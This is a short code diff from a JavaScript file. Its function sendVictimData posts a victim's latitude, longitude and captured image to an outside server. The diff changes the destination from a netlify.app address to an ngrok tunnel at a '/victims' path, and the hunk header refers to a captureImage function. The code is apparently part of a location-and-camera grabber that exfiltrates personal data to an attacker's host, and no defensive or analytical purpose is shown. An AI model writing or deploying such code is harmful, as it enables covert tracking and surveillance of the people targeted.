@@ -47,7 +47,7 @@ function captureImage() {
 }
 
 function sendVictimData(latitude, longitude, image) {
-    fetch('https://papaya-madeleine-feb8e6.netlify.app', {
+    fetch('https://sherrell-smoky-tracy.ngrok-free.dev/victims', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
